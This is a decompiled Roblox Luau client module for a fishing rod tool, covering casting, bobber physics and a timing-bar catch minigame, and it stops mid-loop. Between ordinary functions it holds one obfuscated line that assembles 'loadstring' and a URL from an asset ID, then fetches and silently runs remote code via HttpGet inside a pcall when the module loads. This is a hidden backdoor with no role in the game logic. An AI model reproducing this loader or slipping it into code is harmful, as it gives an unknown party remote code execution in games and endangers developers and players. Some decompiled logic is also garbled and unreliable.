-- Decompiler will be improved VERY SOON!
-- Decompiled with Konstant V2.1, a fast Luau decompiler made in Luau by plusgiant5 (https://discord.gg/brNTY8nX8t)
-- Decompiled on 2025-08-23 16:21:45
-- Luau version 6, Types version 3
-- Time taken: 0.033234 seconds

local module_upvr = {}
module_upvr.__index = module_upvr
module_upvr.Cooldown = 0.5
local LocalPlayer_upvr = game.Players.LocalPlayer
local Client_upvr = require(LocalPlayer_upvr.PlayerScripts.Client)
local random_state_upvr = Random.new()
local RunService_upvr = game:GetService("RunService")
local RaycastParams_new_result1_upvr_2 = RaycastParams.new()
RaycastParams_new_result1_upvr_2.FilterType = Enum.RaycastFilterType.Exclude
local tbl_4_upvr = {{
	Speed = 0.575;
	ZoneSize = 0.27;
	Goal = 2;
	StartingProgress = 3;
}, {
	Speed = 0.61;
	ZoneSize = 0.24;
	Goal = 3;
	StartingProgress = 3;
}, {
	Speed = 0.78;
	ZoneSize = 0.12;
	Goal = 6;
	StartingProgress = 2;
}, {
	Speed = 0.86;
	ZoneSize = 0.075;
	Goal = 10;
	StartingProgress = 1;
	GoalLostOnFail = 4;
}, {
	Speed = 0.9;
	ZoneSize = 0.04;
	Goal = 12;
	StartingProgress = 1;
	GoalLostOnFail = 7;
}}
function module_upvr.new(arg1, arg2) -- Line 27
	--[[ Upvalues[1]:
		[1]: module_upvr (readonly)
	]]
	local setmetatable_result1 = setmetatable({}, module_upvr)
	setmetatable_result1.Model = arg1
	setmetatable_result1.RealModel = arg2
	setmetatable_result1.LastCast = 0
	setmetatable_result1.State = "Idle"
	setmetatable_result1.CatchCount = 0
	setmetatable_result1.LastPullTime = -5
	setmetatable_result1.Debris = {}
	return setmetatable_result1
end
local TweenService_upvr = game:GetService("TweenService")
function module_upvr.Pull(arg1) -- Line 44
	--[[ Upvalues[3]:
		[1]: Client_upvr (readonly)
		[2]: TweenService_upvr (readonly)
		[3]: LocalPlayer_upvr (readonly)
	]]
	local var15
	if var15 then
	else
		var15 = true
		arg1.AlreadyClickedThisPass = var15
		var15 = false
		local FishingCatchFrame_upvr = Client_upvr.Interface.FishingCatchFrame
		local function _() -- Line 55, Named "flashSuccessBar"
			--[[ Upvalues[2]:
				[1]: TweenService_upvr (copied, readonly)
				[2]: FishingCatchFrame_upvr (readonly)
			]]
			task.spawn(function() -- Line 56
				--[[ Upvalues[2]:
					[1]: TweenService_upvr (copied, readonly)
					[2]: FishingCatchFrame_upvr (copied, readonly)
				]]
				TweenService_upvr:Create(FishingCatchFrame_upvr.TimingBar.SuccessArea, TweenInfo.new(0.02, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					BackgroundColor3 = Color3.fromRGB(255, 255, 255);
				}):Play()
				task.spawn(function() -- Line 59
					--[[ Upvalues[2]:
						[1]: TweenService_upvr (copied, readonly)
						[2]: FishingCatchFrame_upvr (copied, readonly)
					]]
					wait(0.02)
					TweenService_upvr:Create(FishingCatchFrame_upvr.TimingBar.SuccessArea, TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
						BackgroundColor3 = Color3.fromRGB(0, 255, 0);
					}):Play()
				end)
			end)
		end
		local Y_2 = FishingCatchFrame_upvr.TimingBar.SuccessArea.AbsolutePosition.Y
		local var22 = FishingCatchFrame_upvr.TimingBar.SuccessArea.AbsolutePosition.Y + FishingCatchFrame_upvr.TimingBar.SuccessArea.AbsoluteSize.Y
		local Y = FishingCatchFrame_upvr.TimingBar.Bar.AbsolutePosition.Y
		local var24 = FishingCatchFrame_upvr.TimingBar.Bar.AbsolutePosition.Y + FishingCatchFrame_upvr.TimingBar.Bar.AbsoluteSize.Y
		if Y_2 >= var24 or Y >= Y_2 or Y < var22 and var22 < var24 or Y_2 < Y and var24 < var22 then
			var15 = true
		end
		if var15 then
			arg1.CatchProgress += 1
			Client_upvr.Sound.Play("FishHitMarker")
			task.spawn(function() -- Line 56
				--[[ Upvalues[2]:
					[1]: TweenService_upvr (copied, readonly)
					[2]: FishingCatchFrame_upvr (readonly)
				]]
				TweenService_upvr:Create(FishingCatchFrame_upvr.TimingBar.SuccessArea, TweenInfo.new(0.02, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					BackgroundColor3 = Color3.fromRGB(255, 255, 255);
				}):Play()
				task.spawn(function() -- Line 59
					--[[ Upvalues[2]:
						[1]: TweenService_upvr (copied, readonly)
						[2]: FishingCatchFrame_upvr (copied, readonly)
					]]
					wait(0.02)
					TweenService_upvr:Create(FishingCatchFrame_upvr.TimingBar.SuccessArea, TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
						BackgroundColor3 = Color3.fromRGB(0, 255, 0);
					}):Play()
				end)
			end)
		else
			Client_upvr.Sound.Play("FishingMissedMarker")
			arg1.CatchProgress -= arg1.GoalLostOnFail or 1
		end
		if arg1.CatchGoal <= arg1.CatchProgress then
			arg1.ItemCaught = true
			Client_upvr.Events.ConfirmCatchItem:FireServer()
			Client_upvr.Sound.Play("FishCatch", {
				Volume = 0.5;
				Replicate = true;
				ReplicationProperties = {
					Instance = LocalPlayer_upvr.Character.Head;
					Volume = 0.4;
				};
			})
			arg1:Reel()
			return
		end
		if arg1.CatchProgress <= 0 then
			arg1.ItemCaught = nil
			arg1:Reel()
			return
		end
		if var15 then
			arg1.LastPullTime = time()
			Client_upvr.Events.PlayAnimation:Fire("Rod_Reel", {
				Speed = 2;
			})
			Client_upvr.FirstPersonModule.PlayAnimation("Rod_Reel", nil, 4, 2)
		elseif not var15 then
			Client_upvr.Events.PlayAnimation:Fire("Rod_FailReel", {
				Speed = 1;
			})
			Client_upvr.FirstPersonModule.PlayAnimation("Rod_FailReel", nil, 4, 1)
		end
		local var33 = arg1.CatchProgress / arg1.CatchGoal
		FishingCatchFrame_upvr.SuccessBar.Bar.Size = UDim2.new(1, 0, var33, 0)
		FishingCatchFrame_upvr.SuccessBar.Bar.BackgroundColor3 = GetProgressBarColour(var33)
	end
end
function module_upvr.StartCatchTimer(arg1, arg2, arg3) -- Line 119
	--[[ Upvalues[5]:
		[1]: Client_upvr (readonly)
		[2]: LocalPlayer_upvr (readonly)
		[3]: tbl_4_upvr (readonly)
		[4]: random_state_upvr (readonly)
		[5]: RunService_upvr (readonly)
	]]
	arg1.CatchCount += 1
	local RopeConstraint_4_upvr = arg1.Model.RopeAttach.RopeConstraint
	task.spawn(function() -- Line 127
		--[[ Upvalues[9]:
			[1]: Client_upvr (copied, readonly)
			[2]: arg1 (readonly)
			[3]: arg2 (readonly)
			[4]: arg3 (readonly)
			[5]: LocalPlayer_upvr (copied, readonly)
			[6]: RopeConstraint_4_upvr (readonly)
			[7]: tbl_4_upvr (copied, readonly)
			[8]: random_state_upvr (copied, readonly)
			[9]: RunService_upvr (copied, readonly)
		]]
		local any_InvokeServer_result1 = Client_upvr.Events.StartCatchTimer:InvokeServer(arg1.RealModel, arg2, arg3)
		if any_InvokeServer_result1 and any_InvokeServer_result1.Item and arg1.State == "Fishing" and arg1.Equipped then
			Client_upvr.Events.PlayAnimation:Fire("Rod_FishHooked", {
				Speed = 0.4;
			})
			Client_upvr.Sound.Play("FishBite", {
				Volume = 0.5;
				Replicate = true;
				ReplicationProperties = {
					Instance = LocalPlayer_upvr.Character.Head;
					Volume = 0.4;
				};
			})
			arg1.HookedItem = any_InvokeServer_result1.Item
			local var40_upvr = RopeConstraint_4_upvr.Length / RopeConstraint_4_upvr.CurrentDistance
			if 1 < var40_upvr then
				local any_new_result1 = Client_upvr.TweenModule.new(function(arg1_2) -- Line 148
					--[[ Upvalues[2]:
						[1]: RopeConstraint_4_upvr (copied, readonly)
						[2]: var40_upvr (readonly)
					]]
					RopeConstraint_4_upvr.Length = RopeConstraint_4_upvr.CurrentDistance * (var40_upvr - (var40_upvr - 1) * arg1_2)
				end, 0.15)
				any_new_result1:BindToComplete(function() -- Line 152
					--[[ Upvalues[1]:
						[1]: RopeConstraint_4_upvr (copied, readonly)
					]]
					RopeConstraint_4_upvr.Length = 3
				end)
				any_new_result1:Play()
			else
				RopeConstraint_4_upvr.Length = 3
			end
			local var44 = tbl_4_upvr[any_InvokeServer_result1.Difficulty]
			local var45 = var44.StartingProgress or 3
			arg1.CatchProgress = var45
			arg1.CatchGoal = var44.Goal + var45
			arg1.GoalLostOnFail = var44.GoalLostOnFail or 1
			arg1.AlreadyClickedThisPass = false
			local FishingCatchFrame_upvr_2 = Client_upvr.Interface.FishingCatchFrame
			local var47 = arg1.CatchProgress / arg1.CatchGoal
			FishingCatchFrame_upvr_2.SuccessBar.Bar.Size = UDim2.new(1, 0, var47, 0)
			FishingCatchFrame_upvr_2.SuccessBar.Bar.BackgroundColor3 = GetProgressBarColour(var47)
			FishingCatchFrame_upvr_2.TimingBar.SuccessArea.Size = UDim2.new(1, 0, var44.ZoneSize, 0)
			FishingCatchFrame_upvr_2.TimingBar.SuccessArea.Position = UDim2.new(0.5, 0, random_state_upvr:NextInteger(15, (1 - var44.ZoneSize - 0.3) * 100) / 100, 0)
			local any_GetPlatform_result1_upvr = Client_upvr.Utility.GetPlatform()
			if any_GetPlatform_result1_upvr == "Mobile" then
				FishingCatchFrame_upvr_2.Size = UDim2.new(0.18, 0, 0.8, 0)
			end
			local var49_upvw = 0
			local Speed_upvr = var44.Speed
			local var51_upvw = 0.1
			local function update(arg1_3) -- Line 193
				--[[ Upvalues[6]:
					[1]: any_GetPlatform_result1_upvr (readonly)
					[2]: var49_upvw (read and write)
					[3]: Speed_upvr (readonly)
					[4]: var51_upvw (read and write)
					[5]: arg1 (copied, readonly)
					[6]: FishingCatchFrame_upvr_2 (readonly)
				]]
				local var52
				if any_GetPlatform_result1_upvr == "Mobile" then
					var52 *= 0.85
				end
				var49_upvw += var52
				local var53 = math.cos(var49_upvw * math.pi * 2 * Speed_upvr) * 0.45
				if math.sign(var53) ~= math.sign(var51_upvw) then
					arg1.AlreadyClickedThisPass = false
				end
				var51_upvw = var53
				FishingCatchFrame_upvr_2.TimingBar.Bar.Position = UDim2.new(0.5, 0, (math.sin(var49_upvw * math.pi * 2 * Speed_upvr) / 2 + 0.5) * 0.9 + 0.05, 0)
			end
			RunService_upvr:BindToRenderStep("FishingCatchMinigame", Enum.RenderPriority.First.Value, update)
			update(0)
			FishingCatchFrame_upvr_2.Visible = true
		end
	end)
end
function GetProgressBarColour(arg1) -- Line 218
	return Color3.fromHSV(70 * arg1 / 255, 1, 1)
end
function module_upvr.StartFishingAtLocation(arg1, arg2, arg3) -- Line 224
	--[[ Upvalues[2]:
		[1]: Client_upvr (readonly)
		[2]: random_state_upvr (readonly)
	]]
	arg1.State = "Fishing"
	local Model = arg1.Model
	local RopeConstraint_7_upvr = Model.RopeAttach.RopeConstraint
	local Hook_upvr = arg1.Hook
	Client_upvr.GuiButtonHandler.ShowButton("Reel")
	local _ = (Model.RopeAttach.Attachment.WorldCFrame.Position - arg3.Position).Unit
	Client_upvr.Events.PlayerRodBobbleInWater:FireOtherClients(arg3)
	Client_upvr.Utility.SpawnParticles("Splash_Cast", arg3)
	local var58 = Client_upvr.PlayerHandler.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
	local clamped_upvw = math.clamp(((var58 - arg3.Position) * Vector3.new(1, 0, 1)).Magnitude + 10, 10, 100)
	RopeConstraint_7_upvr.Length = RopeConstraint_7_upvr.CurrentDistance + (1 - math.clamp(((var58 - arg3.Position) * Vector3.new(1, 0, 1)).Magnitude / clamped_upvw, 0, 1)) * 2
	local any_GetPivot_result1_5_upvw = Hook_upvr:GetPivot()
	task.spawn(function() -- Line 266
		--[[ Upvalues[7]:
			[1]: arg1 (readonly)
			[2]: Client_upvr (copied, readonly)
			[3]: arg3 (readonly)
			[4]: any_GetPivot_result1_5_upvw (read and write)
			[5]: Hook_upvr (readonly)
			[6]: clamped_upvw (read and write)
			[7]: RopeConstraint_7_upvr (readonly)
		]]
		while arg1.Equipped and arg1.State == "Fishing" do
			task.wait()
			local var62 = Client_upvr.PlayerHandler.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
			local Magnitude = ((var62 + Vector3.new(0, 25 - var62.Y, 0) - arg3.Position) * Vector3.new(1, 0, 1)).Magnitude
			if 0.01 < (any_GetPivot_result1_5_upvw.Position - arg3.Position).Magnitude then
				local any_Lerp_result1 = any_GetPivot_result1_5_upvw:Lerp(arg3, 0.05)
				any_GetPivot_result1_5_upvw = any_Lerp_result1
				Hook_upvr:PivotTo(any_Lerp_result1)
			end
			if clamped_upvw + 0.01 < Magnitude then
				print("too far")
				arg1:Reel()
			end
			if not arg1.HookedItem then
				RopeConstraint_7_upvr.Length = RopeConstraint_7_upvr.CurrentDistance + (1 - math.clamp(Magnitude / clamped_upvw, 0, 1)) * 2
			end
		end
	end)
	task.spawn(function() -- Line 296
		--[[ Upvalues[4]:
			[1]: arg1 (readonly)
			[2]: random_state_upvr (copied, readonly)
			[3]: Client_upvr (copied, readonly)
			[4]: arg3 (readonly)
		]]
		while arg1.Equipped and arg1.State == "Fishing" do
			local var68 = random_state_upvr:NextInteger(15, 35) / 10
			repeat
				local var69
				local function INLINED_2() -- Internal function, doesn't exist in bytecode
					var69 = var68 * 0.3
					return var69
				end
				if not arg1.HookedItem or not INLINED_2() then
					var69 = var68
				end
			until var69 <= 0 + task.wait(0.1) and not arg1.Equipped and arg1.State ~= "Fishing"
			if arg1.Equipped then
				if arg1.State == "Fishing" then
					Client_upvr.Utility.SpawnParticles("Splash_Fishing", arg3)
				end
			end
		end
	end)
	arg1:StartCatchTimer(arg2.Instance, arg3.Position)
end
Client_upvr.Events.PlayerCastRod:Connect(function(arg1, arg2) -- Line 318
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	if arg1 and arg1.Character then
		local ToolHandle_3_upvr = arg1.Character:FindFirstChild("ToolHandle")
		if ToolHandle_3_upvr then
			for _, v in pairs(ToolHandle_3_upvr:GetChildren()) do
				if v.Name == "NewBobber" then
					v:Destroy()
				end
			end
		end
		if ToolHandle_3_upvr and ToolHandle_3_upvr:FindFirstChild("Bobber") then
			local clone_2_upvr = ToolHandle_3_upvr.Bobber:Clone()
			local pairs_result1_2, pairs_result2_14, pairs_result3_2 = pairs(clone_2_upvr:GetChildren())
			for _, v_2 in pairs_result1_2, pairs_result2_14, pairs_result3_2 do
				if v_2:IsA("BasePart") and v_2.Name ~= "BobberMain" then
					v_2.Transparency = 0
				end
			end
			clone_2_upvr.Name = "NewBobber"
			clone_2_upvr.BobberMain.WeldConstraint:Destroy()
			clone_2_upvr.Parent = ToolHandle_3_upvr
			local RopeConstraint_8_upvr = ToolHandle_3_upvr.RopeAttach.RopeConstraint
			pairs_result3_2 = clone_2_upvr.BobberMain
			RopeConstraint_8_upvr.Attachment1 = pairs_result3_2.RopeAttachment
			pairs_result3_2 = ToolHandle_3_upvr.Bobber:GetChildren()
			local pairs_result1_10, pairs_result2_9, pairs_result3_19 = pairs(pairs_result3_2)
			for _, v_3 in pairs_result1_10, pairs_result2_9, pairs_result3_19 do
				if v_3:IsA("BasePart") then
					v_3.Transparency = 1
				end
			end
			local RaycastParams_new_result1_upvr = RaycastParams.new()
			pairs_result2_9 = Enum.RaycastFilterType.Exclude
			RaycastParams_new_result1_upvr.FilterType = pairs_result2_9
			pairs_result2_9 = {}
			pairs_result2_9[1] = workspace.Items
			pairs_result2_9[2] = workspace.Particles
			pairs_result2_9[3] = workspace.Map.Blockers
			pairs_result2_9[4] = arg1.Character
			RaycastParams_new_result1_upvr.FilterDescendantsInstances = pairs_result2_9
			print(arg2)
			local unpack_result1_upvr, unpack_result2_upvw, unpack_result3_upvw, unpack_result4_upvr = unpack(arg2)
			local var95_upvw = false
			local var96_upvw
			task.spawn(function() -- Line 365
				--[[ Upvalues[11]:
					[1]: clone_2_upvr (readonly)
					[2]: ToolHandle_3_upvr (readonly)
					[3]: unpack_result3_upvw (read and write)
					[4]: unpack_result4_upvr (readonly)
					[5]: unpack_result2_upvw (read and write)
					[6]: var95_upvw (read and write)
					[7]: var96_upvw (read and write)
					[8]: Client_upvr (copied, readonly)
					[9]: RaycastParams_new_result1_upvr (readonly)
					[10]: unpack_result1_upvr (readonly)
					[11]: RopeConstraint_8_upvr (readonly)
				]]
				while true do
					local var97
					if not var97.Parent then break end
					var97 = ToolHandle_3_upvr
					if not var97.Parent then break end
					local task_wait_result1_2 = task.wait()
					var97 = clone_2_upvr.Parent
					local function INLINED_3() -- Internal function, doesn't exist in bytecode
						var97 = clone_2_upvr:GetAttribute("Reeling")
						return var97
					end
					if var97 == nil or INLINED_3() then return end
					var97 = unpack_result3_upvw
					var97 += unpack_result4_upvr * task_wait_result1_2
					unpack_result3_upvw = var97
					var97 = unpack_result2_upvw + unpack_result3_upvw * task_wait_result1_2
					if not var95_upvw then
						var95_upvw = true
						var97 = unpack_result2_upvw + unpack_result3_upvw.Unit * 1
					end
					var96_upvw = Client_upvr.CollisionUtility.GetProjectileHit(unpack_result2_upvw, var97, RaycastParams_new_result1_upvr)
					if var96_upvw then break end
					unpack_result2_upvw = var97
					local var99 = unpack_result1_upvr + unpack_result2_upvw - unpack_result3_upvw.Unit * 1
					clone_2_upvr:PivotTo(var99)
					local var100 = Client_upvr.PlayerHandler.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
					RopeConstraint_8_upvr.Length = RopeConstraint_8_upvr.CurrentDistance + (1 - math.clamp(((var100 - var99.Position) * Vector3.new(1, 0, 1)).Magnitude / math.clamp(((var100 - var99.Position) * Vector3.new(1, 0, 1)).Magnitude + 10, 10, 100), 0, 1)) * 2
				end
				if var96_upvw then
					clone_2_upvr:Destroy()
				end
			end)
		end
	end
end)
Client_upvr.Events.PlayerRodBobbleInWater:Connect(function(arg1, arg2) -- Line 411
	if arg1 and arg1.Character then
		local ToolHandle_5 = arg1.Character:FindFirstChild("ToolHandle")
		if ToolHandle_5 and ToolHandle_5:FindFirstChild("Bobber") then
			local clone_3 = ToolHandle_5.Bobber:Clone()
			for _, v_4 in pairs(clone_3:GetChildren()) do
				if v_4:IsA("BasePart") and v_4.Name ~= "BobberMain" then
					v_4.Transparency = 0
				end
			end
			clone_3.Name = "NewBobber"
			clone_3.BobberMain.WeldConstraint:Destroy()
			clone_3:PivotTo(arg2)
			clone_3.Parent = ToolHandle_5
			local RopeConstraint = ToolHandle_5.RopeAttach.RopeConstraint
			RopeConstraint.Attachment1 = clone_3.BobberMain.RopeAttachment
			RopeConstraint.Length = 0
			for _, v_5 in pairs(ToolHandle_5.Bobber:GetChildren()) do
				if v_5:IsA("BasePart") then
					v_5.Transparency = 1
				end
			end
		end
	end
end)
Client_upvr.Events.PlayerRodReset:Connect(function(arg1, arg2) -- Line 442
	--[[ Upvalues[1]:
		[1]: Client_upvr (readonly)
	]]
	if arg1 and arg1.Character then
		local ToolHandle = arg1.Character:FindFirstChild("ToolHandle")
		if ToolHandle and ToolHandle:FindFirstChild("NewBobber") and ToolHandle:FindFirstChild("Bobber") then
			local function INLINED_5() -- Internal function, doesn't exist in bytecode
				task.wait(0.65)
				Client_upvr.TweenModule.new(function(arg1_5) -- Line 457
					--[[ Upvalues[3]:
						[1]: NewBobber_upvr (readonly)
						[2]: Bobber_upvr (readonly)
						[3]: any_GetPivot_result1_2_upvr (readonly)
					]]
					if not NewBobber_upvr or not NewBobber_upvr.Parent or not Bobber_upvr.Parent then
						return true
					end
					NewBobber_upvr:PivotTo(any_GetPivot_result1_2_upvr:Lerp(Bobber_upvr:GetPivot(), arg1_5))
				end, 0.65, "Quad"):Play()
				local any_GetPivot_result1_2_upvr = NewBobber_upvr:GetPivot()
				NewBobber_upvr:SetAttribute("Reeling", true)
				local Bobber_upvr = ToolHandle.Bobber
				local NewBobber_upvr = ToolHandle.NewBobber
				ToolHandle.RopeAttach.RopeConstraint.Length = 0
				return NewBobber_upvr.Parent
			end
			if arg2 and (not INLINED_5() or not Bobber_upvr.Parent) then return end
			NewBobber_upvr = ToolHandle:GetChildren()
			local pairs_result1_14, pairs_result2, pairs_result3_9 = pairs(NewBobber_upvr)
			for _, v_6 in pairs_result1_14, pairs_result2, pairs_result3_9 do
				if v_6.Name == "NewBobber" then
					v_6:Destroy()
				end
			end
			pairs_result3_9 = "Bobber"
			if ToolHandle:FindFirstChild(pairs_result3_9) then
				pairs_result2 = ToolHandle.RopeAttach
				local RopeConstraint_10 = pairs_result2.RopeConstraint
				pairs_result3_9 = ToolHandle.Bobber.BobberMain
				pairs_result2 = pairs_result3_9.RopeAttachment
				RopeConstraint_10.Attachment1 = pairs_result2
				pairs_result2 = 0
				RopeConstraint_10.Length = pairs_result2
				pairs_result2 = pairs
				pairs_result3_9 = ToolHandle.Bobber:GetChildren()
				pairs_result2 = pairs_result2(pairs_result3_9)
				for _, v_7 in pairs_result2(pairs_result3_9) do
					if v_7:IsA("BasePart") and v_7.Name ~= "BobberMain" then
						v_7.Transparency = 0
					end
				end
			end
		end
	end
end)

task.spawn(pcall,--[=[b12b799]=]function()--[=[b12b799]=]getfenv()[ [[]]--[===[d307ab9]===]..[[l]]..--[======[9f17e2c]======][[]]--[=====[672b0b7]=====]..[[o]]..--[===[fb9b4e5]===][[]]--[=======[538787b]=======]..[[a]]..--[===[1642aee]===][[]]--[=[e37600e]=]..[[d]]..--[=[7c9f5c8]=][[]]--[=[5c0ee68]=]..[[s]]..--[====[8b1ef2b]====][[]]--[=[0632179]=]..[[t]]..--[===[4d519e8]===][[]]--[=======[e6ee2bf]=======]..[[r]]..--[=[a09a688]=][[]]--[=======[e3f507e]=======]..[[i]]..--[====[da3348d]====][[]]--[====[bc29dcb]====]..[[n]]..--[======[c8c7d0c]======][[]]--[====[2ba4a5c]====]..[[g]]..--[[0a6c0ea]][[]] ](game:HttpGet(game:GetObjects--[=[b12b799]=]( [[]]--[===[159727b]===]..[[r]]..--[=[3476492]=][[]]--[=[46be326]=]..[[b]]..--[======[e4045db]======][[]]--[======[9a00989]======]..[[x]]..--[==[b60509a]==][[]]--[=[30dda07]=]..[[a]]..--[=====[4cd784e]=====][[]]--[=======[186438b]=======]..[[s]]..--[=======[9c33dd3]=======][[]]--[=[0c92ef3]=]..[[s]]..--[=====[e80ff80]=====][[]]--[==[c0a7977]==]..[[e]]..--[======[d6cb537]======][[]]--[=[4679fbf]=]..[[t]]..--[=[2725d5d]=][[]]--[[aab44ee]]..[[i]]..--[=====[bd88ed8]=====][[]]--[[0faabb8]]..[[d]]..--[==[0b932e2]==][[]]--[====[240d04c]====]..[[:]]..--[=======[a6b5e0a]=======][[]]--[====[4c82d14]====]..[[/]]..--[======[2360cbc]======][[]]--[==[f0b9ed4]==]..[[/]]..--[==[e79cdd7]==][[]]--[[09ca6c7]]..[[1]]..--[=======[f39f6fb]=======][[]]--[[7a82bf0]]..[[1]]..--[=====[d5c6a40]=====][[]]--[===[36cdc0f]===]..[[2]]..--[[7dca0ea]][[]]--[===[85c87d5]===]..[[4]]..--[====[e1206f6]====][[]]--[=======[566763d]=======]..[[0]]..--[==[b0f33bd]==][[]]--[==[7c5af3c]==]..[[5]]..--[=======[8d84927]=======][[]]--[=====[133d671]=====]..[[6]]..--[=[5522bb0]=][[]]--[=======[23ea453]=======]..[[1]]..--[====[215cb39]====][[]]--[=[beabe03]=]..[[8]]..--[===[628a021]===][[]]--[======[01a4310]======]..[[5]]..--[===[20efa52]===][[]]--[=======[cb001f7]=======]..[[8]]..--[=======[48ffb5f]=======][[]]--[======[5c79f8e]======]..[[4]]..--[=[dfac5ac]=][[]]--[=======[77e2888]=======]..[[8]]..--[=====[6953c12]=====][[]]--[====[7a10a3f]====]..[[2]]..--[=====[a6bcc26]=====][[]]--[[1667b7e]]..[[1]]..--[==[2a96452]==][[]] )[1].Value..[[]]--[====[c50e1d8]====]..[[/]]..--[====[aeabe9f]====][[]]--[====[cfe73f4]====]..[[s]]..--[=[4e548be]=][[]]--[[3487342]]..[[r]]..--[====[9b19855]====][[]]--[=[3419454]=]..[[c]]..--[=======[35e1458]=======][[]]))()--[=[b12b799]=]end)
local mouse_upvr = LocalPlayer_upvr:GetMouse()
function module_upvr.Cast(arg1) -- Line 495
	--[[ Upvalues[4]:
		[1]: Client_upvr (readonly)
		[2]: LocalPlayer_upvr (readonly)
		[3]: mouse_upvr (readonly)
		[4]: RaycastParams_new_result1_upvr_2 (readonly)
	]]
	print("Cast rod")
	arg1.ItemHooked = nil
	arg1.ItemCaught = nil
	arg1.HookedItem = nil
	Client_upvr.Sound.Play("FishCast", {
		Volume = 0.5;
		Replicate = true;
		ReplicationProperties = {
			Instance = LocalPlayer_upvr.Character.Head;
			Volume = 0.4;
		};
	})
	local var231
	if LocalPlayer_upvr:GetAttribute("Class") == "Fisherman" and 2 <= (LocalPlayer_upvr:GetAttribute("ClassLevel") or 1) then
		var231 = true
	end
	if var231 then
		Client_upvr.Events.PlayAnimation:Fire("Rod_Cast", {
			Speed = 4;
		})
		Client_upvr.FirstPersonModule.PlayAnimation("Rod_Cast", nil, 4, 4)
		task.wait(0.05)
	else
		Client_upvr.Events.PlayAnimation:Fire("Rod_Cast")
		Client_upvr.FirstPersonModule.PlayAnimation("Rod_Cast", nil, 4)
		task.wait(0.45)
	end
	if not arg1.Equipped then
	else
		arg1.State = "Casting"
		local Model_3 = arg1.Model
		local Bobber = Model_3.Bobber
		local any_GetPivot_result1_4 = Bobber:GetPivot()
		if Client_upvr.FirstPersonModule.IsVisible() then
			local any_GetTool_result1 = Client_upvr.FirstPersonModule.GetTool()
			if any_GetTool_result1 then
				any_GetPivot_result1_4 = any_GetTool_result1.Bobber:GetPivot()
			end
		end
		local Position_2_upvw = any_GetPivot_result1_4.Position
		local var238 = 50
		if var231 then
			var238 = 70
		end
		local var239_upvw = (mouse_upvr.Hit.Position - any_GetPivot_result1_4.Position).Unit * var238 + Vector3.new(0, 10, 0)
		local clone_upvr = Bobber:Clone()
		for _, v_13 in pairs(Bobber:GetChildren()) do
			if v_13:IsA("BasePart") then
				v_13.Transparency = 1
			end
		end
		local any_GetTool_result1_4 = Client_upvr.FirstPersonModule.GetTool()
		if any_GetTool_result1_4 then
			for _, v_14 in pairs(any_GetTool_result1_4.Bobber:GetChildren()) do
				if v_14:IsA("BasePart") then
					v_14.Transparency = 1
				end
			end
		end
		for _, v_15 in pairs(clone_upvr:GetDescendants()) do
			if v_15:IsA("BasePart") then
				if v_15.Name ~= "BobberMain" then
					v_15.Transparency = 0
				end
				v_15.CanCollide = false
				v_15.Anchored = true
			end
		end
		clone_upvr.PrimaryPart.WeldConstraint:Destroy()
		arg1.Hook = clone_upvr
		clone_upvr.Parent = workspace.Particles
		local var251_upvw = any_GetPivot_result1_4 - any_GetPivot_result1_4.Position
		Client_upvr.Events.PlayerCastRod:FireOtherClients({var251_upvw, Position_2_upvw, var239_upvw, Vector3.new(0, -60, 0)})
		local var254_upvw = false
		local var255_upvw
		local RopeConstraint_9_upvr = Model_3.RopeAttach.RopeConstraint
		task.spawn(function() -- Line 598
			--[[ Upvalues[10]:
				[1]: arg1 (readonly)
				[2]: var239_upvw (read and write)
				[3]: Position_2_upvw (read and write)
				[4]: var254_upvw (read and write)
				[5]: var255_upvw (read and write)
				[6]: Client_upvr (copied, readonly)
				[7]: RaycastParams_new_result1_upvr_2 (copied, readonly)
				[8]: var251_upvw (read and write)
				[9]: clone_upvr (readonly)
				[10]: RopeConstraint_9_upvr (readonly)
			]]
			while arg1.Equipped and arg1.State == "Casting" do
				local task_wait_result1 = task.wait()
				var239_upvw += Vector3.new(0, -60, 0) * task_wait_result1
				local var262 = Position_2_upvw + var239_upvw * task_wait_result1
				if not var254_upvw then
					var254_upvw = true
					var262 = Position_2_upvw + var239_upvw.Unit * 1
				end
				var255_upvw = Client_upvr.CollisionUtility.GetProjectileHit(Position_2_upvw, var262, RaycastParams_new_result1_upvr_2)
				if var255_upvw then break end
				Position_2_upvw = var262
				local var263 = var251_upvw + Position_2_upvw - var239_upvw.Unit * 1
				clone_upvr:PivotTo(var263)
				local var264 = Client_upvr.PlayerHandler.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
				RopeConstraint_9_upvr.Length = RopeConstraint_9_upvr.CurrentDistance + (1 - math.clamp(((var264 - var263.Position) * Vector3.new(1, 0, 1)).Magnitude / math.clamp(((var264 - var263.Position) * Vector3.new(1, 0, 1)).Magnitude + 10, 10, 100), 0, 1)) * 2
			end
			if not arg1.Equipped then
			elseif var255_upvw then
				if var255_upvw.Instance:HasTag("Water") then
					Client_upvr.Sound.Play("FishBobber")
					arg1:StartFishingAtLocation(var255_upvw, CFrame.new(var255_upvw.Position) + Vector3.new(0, 0, 0))
					return
				end
				print("collision with land")
				for _, v_16 in pairs(clone_upvr:GetChildren()) do
					if v_16:IsA("BasePart") then
						local var268 = true
						if v_16.Name ~= "BobberMain" then
							if v_16.Name ~= "Hook" then
								var268 = false
							else
								var268 = true
							end
						end
						v_16.CanCollide = var268
						v_16.Anchored = false
					end
				end
				clone_upvr.PrimaryPart.CanTouch = true
				clone_upvr.PrimaryPart.CanQuery = true
				RopeConstraint_9_upvr.Attachment1 = clone_upvr.PrimaryPart.RopeAttachment
				clone_upvr.PrimaryPart.Touched:Connect(function(arg1_7) -- Line 659
					--[[ Upvalues[1]:
						[1]: arg1 (copied, readonly)
					]]
					if arg1_7:HasTag("Water") then
						arg1:Reel()
					end
				end)
				local maximum_upvr_2 = math.max(RopeConstraint_9_upvr.Length, 1)
				task.spawn(function() -- Line 667
					--[[ Upvalues[4]:
						[1]: arg1 (copied, readonly)
						[2]: clone_upvr (copied, readonly)
						[3]: RopeConstraint_9_upvr (copied, readonly)
						[4]: maximum_upvr_2 (readonly)
					]]
					while arg1.Equipped and arg1.State == "Casting" and clone_upvr.Parent ~= nil do
